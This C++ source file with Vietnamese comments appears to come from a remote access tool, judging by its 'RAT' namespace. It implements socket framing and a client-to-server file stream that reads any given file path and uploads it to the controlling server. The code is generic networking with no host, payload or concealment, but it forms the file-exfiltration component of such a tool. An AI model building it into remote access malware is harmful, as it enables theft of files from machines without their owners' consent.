#include "socket_utils.h"
#include "protocol.h"
#include "platform.h"

#include <string>
#include <iostream>
#include <filesystem>
#include <fstream>

namespace RAT
{
    // Gửi dữ liệu chính xác `size` byte qua socket
    bool send_exact(socket_t sock, const void *data, size_t size)
    {
        // Kiểm tra socket và dữ liệu hợp lệ
        if (sock == INVALID_SOCKET_VAL || data == nullptr)
        {
            return false;
        }

        const char *ptr = static_cast<const char *>(data);
        size_t total_sent = 0;

        // Đảm bảo dữ liệu được gửi chính xác `size` byte
        while (total_sent < size)
        {
            ssize_t bytes_sent = ::send(sock, ptr + total_sent, size - total_sent, MSG_NOSIGNAL);
            if (bytes_sent <= 0)
            {
                return false;
            }
            total_sent += static_cast<size_t>(bytes_sent);
        }
        return true;
    }

    // Nhận dữ liệu chính xác `size` byte từ socket
    bool recv_exact(socket_t sock, void *data, size_t size)
    {
        // Kiểm tra socket và dữ liệu hợp lệ
        if (sock == INVALID_SOCKET_VAL || data == nullptr)
        {
            return false;
        }

        char *ptr = static_cast<char *>(data);
        size_t total_received = 0;

        // Đảm bảo dữ liệu được nhận chính xác `size` byte
        while (total_received < size)
        {
            ssize_t bytes_received = ::recv(sock, ptr + total_received, size - total_received, 0);
            if (bytes_received <= 0)
            {
                return false;
            }
            total_received += static_cast<size_t>(bytes_received);
        }
        return true;
    }

    // Gửi thông điệp với định dạng: `[4 bytes: Độ dài dữ liệu (uint32_t)] + [N bytes: Nội dung văn bản]`
    bool send_message(socket_t sock, const std::string &msg)
    {
        // Kiểm tra socket
        if (sock == INVALID_SOCKET_VAL)
        {
            return false;
        }

        uint32_t len = static_cast<uint32_t>(msg.size());

        // Kiểm tra kích thước thông điệp
        if (len > MAX_MESSAGE_SIZE)
        {
            std::cerr << "[!] Error: Message size exceeds MAX_MESSAGE_SIZE (" << len << " bytes)\n";
            return false;
        }

        // Chuyển đổi độ dài thông điệp sang định dạng mạng
        uint32_t net_len = htonl(len);

        // Gửi header (độ dài thông điệp)
        if (!send_exact(sock, &net_len, sizeof(net_len)))
        {
            return false;
        }

        // Gửi nội dung tin nhắn nếu có
        if (len > 0)
        {
            if (!send_exact(sock, msg.data(), len))
            {
                return false;
            }
        }
        return true;
    }

    // Nhận thông điệp với định dạng: `[4 bytes: Độ dài dữ liệu (uint32_t)] + [N bytes: Nội dung văn bản]`
    bool recv_message(socket_t sock, std::string &msg)
    {
        if (sock == INVALID_SOCKET_VAL)
        {
            return false;
        }

        // Nhận header (độ dài thông điệp)
        uint32_t net_len = 0;
        if (!recv_exact(sock, &net_len, sizeof(net_len)))
        {
            return false;
        }

        // Chuyển đổi độ dài thông điệp từ định dạng mạng sang định dạng máy
        uint32_t len = ntohl(net_len);

        // Kiểm tra kích thước thông điệp
        if (len > MAX_MESSAGE_SIZE)
        {
            std::cerr << "[!] Error: Message size exceeds MAX_MESSAGE_SIZE (" << len << " bytes)\n";
            return false;
        }
        if (len == 0)
        {
            msg.clear();
            return true;
        }

        // Nhận nội dung thông điệp
        msg.resize(len);
        if (!recv_exact(sock, msg.data(), len))
        {
            msg.clear();
            return false;
        }
        return true;
    }

    // 1. Phía gửi (Client): Gửi từng block 64KB
    bool send_file_stream(socket_t sock, const std::string &filepath)
    {
        namespace fs = std::filesystem;
        FileTransferHeader header{};
        std::error_code ec;

        // Kiểm tra file tồn tại và không phải là thư mục
        if (!fs::exists(filepath, ec) || fs::is_directory(filepath, ec))
        {
            header.status_code = 1; // File không tồn tại / là folder
            header.file_size = 0;
            send_exact(sock, &header, sizeof(header));
            return false;
        }

        // Mở file dạng nhị phân trước khi gửi header
        std::ifstream file(filepath, std::ios::binary);
        if (!file.is_open())
        {
            header.status_code = 2; // Không mở được file (lỗi quyền đọc)
            header.file_size = 0;
            send_exact(sock, &header, sizeof(header));
            return false;
        }

        uint64_t total_size = fs::file_size(filepath, ec);
        header.status_code = 0;                     // OK
        header.file_size = rat_htobe64(total_size); // Chuẩn hóa Endian cho 64-bit

        // Bước 1: Gửi Header bắt tay
        if (!send_exact(sock, &header, sizeof(header)))
            return false;

        // Bước 2: Đọc và truyền từng khối 64KB
        char buffer[FILE_CHUNK_SIZE];
        while (file.read(buffer, sizeof(buffer)) || file.gcount() > 0)
        {
            uint32_t chunk_len = static_cast<uint32_t>(file.gcount());
            uint32_t net_len = htonl(chunk_len);

            // Gửi độ dài khối (4 bytes)
            if (!send_exact(sock, &net_len, sizeof(net_len)))
                return false;
            // Gửi dữ liệu khối
            if (!send_exact(sock, buffer, chunk_len))
                return false;
        }

        // Bước 3: Gửi EOF Marker
        uint32_t eof_marker = 0;
        return send_exact(sock, &eof_marker, sizeof(eof_marker));
    }

    // 2. Phía nhận (Server): Nhận từng block và ghi ngay xuống đĩa cứng
    bool recv_file_stream(socket_t sock, const std::string &save_path)
    {
        namespace fs = std::filesystem;
        FileTransferHeader header{};

        // Bước 1: Nhận Header bắt tay
        if (!recv_exact(sock, &header, sizeof(header)))
            return false;
        if (header.status_code != 0)
        {
            if (header.status_code == 1)
            {
                std::cerr << Status::ERR << "Client bao loi: File khong ton tai hoac la thu muc!\n";
            }
            else if (header.status_code == 2)
            {
                std::cerr << Status::ERR << "Client bao loi: Khong co quyen doc file!\n";
            }
            else
            {
                std::cerr << Status::ERR << "Client bao loi khong the doc file (ma loi: " << static_cast<int>(header.status_code) << ")!\n";
            }
            return false;
        }

        uint64_t total_size = rat_be64toh(header.file_size);

        // Tạo thư mục cha nếu chưa tồn tại
        std::error_code ec;
        fs::path p(save_path);
        if (p.has_parent_path())
        {
            fs::create_directories(p.parent_path(), ec);
        }

        // Mở file trên Server để ghi dữ liệu nhị phân
        std::ofstream outfile(save_path, std::ios::binary);
        if (!outfile.is_open())
        {
            std::cerr << Status::ERR << "Khong the tao file de ghi: " << save_path << "\n";
            return false;
        }

        char buffer[FILE_CHUNK_SIZE];
        uint64_t total_received = 0;

        // Bước 2: Vòng lặp nhận từng khối
        while (true)
        {
            // Nhận độ dài khối (4 bytes)
            uint32_t net_len = 0;
            if (!recv_exact(sock, &net_len, sizeof(net_len)))
                return false;

            uint32_t chunk_len = ntohl(net_len);
            if (chunk_len == 0)
                break; // Đã nhận EOF Marker

            // Kiểm tra an toàn: tránh tràn bộ đệm stack nếu chunk_len bất thường
            if (chunk_len > FILE_CHUNK_SIZE)
            {
                std::cerr << "\n"
                          << Status::ERR << "Loi: Kich thuoc chunk vuot qua FILE_CHUNK_SIZE!\n";
                return false;
            }

            if (!recv_exact(sock, buffer, chunk_len))
                return false;

            // Ghi xuống ổ cứng
            outfile.write(buffer, chunk_len);
            total_received += chunk_len;

            // Hiển thị tiến độ tải (%)
            if (total_size > 0)
            {
                int percent = static_cast<int>((total_received * 100) / total_size);
                std::cout << "\r[*] Dang tai: " << percent << "% ("
                          << total_received << "/" << total_size << " bytes)" << std::flush;
            }
        }
        std::cout << "\n"
                  << Status::OK << "Tai file thanh cong! Luu tai: " << save_path << "\n";
        return true;
    }

    // Đóng socket và đặt giá trị socket về -1 (hoặc INVALID_SOCKET)
    void close_socket(socket_t &sock)
    {
        if (sock != INVALID_SOCKET_VAL)
        {
            CLOSE_SOCKET(sock);
            sock = INVALID_SOCKET_VAL;
        }
    }
}